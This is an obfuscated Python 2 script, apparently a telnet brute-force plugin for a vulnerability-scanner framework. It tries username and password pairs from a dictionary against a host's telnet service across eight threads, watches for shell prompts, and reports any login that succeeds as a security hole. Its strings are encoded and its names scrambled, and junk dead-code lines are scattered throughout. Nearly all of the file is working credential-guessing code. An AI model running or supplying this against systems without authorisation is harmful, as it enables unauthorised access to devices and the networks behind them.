#Embedded file name: telnet_crack.py
import sys
import telnetlib
import Queue
if 0:
    i11iIiiIii
if 0:
    O0 / iIii1I11I1II1 % OoooooooOO - i1IIi

def o0OO00(host, port, user, pwd):
    oo = False
    for i1iII1IiiIiI1 in range(10):
        iIiiiI1IiI1I1 = False
        try:
            debug(decode("\x96\x0eN\x01a:\xe5\xd6\xa3\x80\xc4\x9c0\\\xe6\xa4\xcb#\x9a\xde\xd7\x8aZ\x10\x88'\x02\x1cC"), i1iII1IiiIiI1, user, pwd, host, port)
            o0OoOoOO00 = telnetlib.Telnet(host, port, timeout=10)
            o0OoOoOO00.expect([decode('\xabO.W&]'), decode('\xb5H\x0ea&+\xe9\x87')], 5)
            o0OoOoOO00.write(user + decode('\xc2'))
            o0OoOoOO00.expect([decode('\xa4l+q0\x08\xde\x97\xc0')], 5)
            o0OoOoOO00.write(pwd + decode('\xc2'))
            I11i, O0O, O0O = o0OoOoOO00.expect([decode('\xa7='), decode('\xa7\x1b'), decode('\xa7\x0c')], 5)
            o0OoOoOO00.close()
            if I11i != -1:
                oo = True
        except Exception as Oo:
            if 0:
                o0 * i1 * ii1IiI1i % OOooOOo / I11iIi1I / IiiIII111iI
            iIiiiI1IiI1I1 = True
        else:
            if 0:
                iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
        finally:
            if not iIiiiI1IiI1I1:
                return oo

    return
    if 0:
        i11Ii11I1Ii1i.ooO - OOoO / II * OOooOOo.o0


def Ii1IIii11(arg):
    Oooo0000, i11, I11, Oo0o0000o0o0, oOo0oooo00o, oO0o0o0ooO0oO = arg
    try:
        oo = o0OO00(i11, I11, Oo0o0000o0o0, oOo0oooo00o)
        if oo:
            oo0o0O00 = {}
            oo0o0O00[decode('\xbdH\x0ea&+\xe9\x87')] = Oo0o0000o0o0
            oo0o0O00[decode('\xacl+q0\x08\xde\x97')] = oOo0oooo00o or decode('\xefm\x0cA\x00-\x9d')
            oO0o0o0ooO0oO.put(oo0o0O00)
            Oooo0000.stop()
            if 0:
                O0oo0OO0.i1 / II
        if oo == None:
            Oooo0000.stop()
    except Exception as Oo:
        if 0:
            OOooOOo / OOooOOo


def assign(service, arg = None):
    if service == '''telnet''':
        return (True, arg)
        if 0:
            OOooOOo


def audit(arg):
    i11, I11 = arg
    oo0o0O00 = {}
    if o0OO00(i11, I11, decode('\x8bm:T!.\xce\x87\xa7\x84\xf3\xae\x05z\x90\xc4\xa9'), decode('\x8bm:T!.\xce\x87\xa7\x95\xd7\x8b\x15l\xb3\xf3\xb9')) == None:
        return
        if 0:
            O00oOoOoO0o0O * IiiIII111iI / o0.iii1I1I + O0oo0OO0
    Oooo0000 = threadpool.ThreadPool(8)
    iI11 = util.load_password_dict(i11, decode('\xa9l\x1aU%+\xce\x87\xd5\x94\xd6\xbc\x02H\x85\xe8\xadF\xbf\x9c\xe5\xbbTD'), decode('\xa9l\x1aU%+\xce\x87\xd5\x94\xd6\xbc\x02H\x85\xe8\xbcb\x9a\x8c\xe5\xbbTD'))
    oO0o0o0ooO0oO = Queue.Queue()
    for iII111ii in iI11:
        Oooo0000.push(Ii1IIii11, (Oooo0000,
         i11,
         I11,
         iII111ii[0],
         iII111ii[1],
         oO0o0o0ooO0oO))

    Oooo0000.wait()
    if not oO0o0o0ooO0oO.empty():
        oo0o0O00 = oO0o0o0ooO0oO.get()
        security_hole(decode('\xf9Hy\x14\x04{\xff\x87\xa5\xb2\xd6\xbaa]\x90\xe3\x8cG\x9d\x9c\x87\xfe@u\xfc\x10gna@') % (i11,
         I11,
         oo0o0O00[decode('\xbdH\x0ea&+\xe9\x87')],
         oo0o0O00[decode('\xacl+q0\x08\xde\x97')]))
        if 0:
            II + O0


if __name__ == '__main__':
    from dummy import *
    import threadpool
    audit(assign('''telnet''', (decode('\xfc*{&Q^\xbc\xf5\xe2\xf2\xa3\xfbu'), 23))[1])

#KEY---e034570d4d73b2deeed98ff76911c89ff03ae6f0cef61a09f4091b55783c18b2---